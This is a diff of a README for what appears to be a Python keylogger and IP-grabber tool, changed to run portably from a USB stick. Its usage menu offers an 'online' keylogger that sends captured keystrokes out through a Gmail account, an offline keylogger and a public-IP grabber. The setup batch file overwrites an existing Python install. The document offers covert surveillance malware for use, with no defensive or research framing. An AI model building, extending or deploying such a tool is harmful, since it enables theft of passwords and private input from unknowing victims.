@@ -1,10 +1,17 @@
 # Keylogger
 
-This Python script is a simple keylogger that captures and logs keyboard inputs. It utilizes the `keyboard` library to hook into the keyboard events and record the pressed keys. The captured keys are then printed to the console and saved to a text file for later analysis.
+This Python script is a simple portable keylogger and ipgrabber. It installs a pre-installed version of Python 3.11 with neccesary modules.
+
+# Warning
+
+Do not use this with a computer that has installed the same version of Python, it will replace all the files!
 
 ## Usage
 
-1. Run the batch `setup.bat`.
-2. The keylogger will start capturing keyboard inputs.
-3. Press any key to record it.
-4. The captured keys will be printed to the console and saved in a text file.
+Clone repository to a USB
+Run the batch `setup.bat`.
+Select the script you want to run. These are the options:
+
+1. open online keylogger (requires setting up gmail account): 1
+2. open offline keylogger (logs in keylogs.txt locally) 2
+3. open offline IPGrabber (logs in public_ip.txt locally) 3
